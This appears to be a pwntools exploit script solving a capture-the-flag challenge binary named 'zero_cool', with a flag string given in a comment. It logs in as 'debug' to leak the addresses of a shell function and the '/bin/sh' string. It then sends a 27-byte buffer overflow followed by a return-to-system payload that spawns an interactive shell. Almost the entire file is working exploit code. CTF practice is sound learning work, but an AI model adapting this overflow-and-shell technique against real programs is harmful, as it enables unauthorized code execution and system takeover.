#!/usr/bin/python3

from pwn import *
from pprint import pprint

context.arch = 'i386'
context.log_level = 'debug'

# Leak memory by using the username: debug

# The attack

"""
1. Read the leaked shell/system function address from debug print
2. Read the leaked '/bin/sh' string address from debug print
3. craft an exploit with the shell function and the string adddress as a parameter
"""

# Flag: 10an{run_4nt1_v1ru5_g1v3_m3_5y5t3m5_d15pl4y_n0w}



elf = ELF('./zero_cool')
sh = elf.process()

sh.recvuntil('Username: ')
sh.sendline('debug')

offset = 27 # offset before overflowing password buffer

shell_func = sh.recvline().decode('utf-8').split(': ')[1] # Leaked shell function
shell_func_param = sh.recvline().decode('utf-8').split(': ')[1] # Leaked /bin/sh string

shell_func_addr = int(shell_func, 16) # Leaked shell function in decimal
shell_func_param_addr = int(shell_func_param, 16) # Leaked /bin/sh string in decimal

payload = [
        b"A"*offset,
        p32(shell_func_addr),
        b"A"*4,
        p32(shell_func_param_addr)
]

payload = b"".join(payload)
sh.sendline(payload)
sh.interactive()
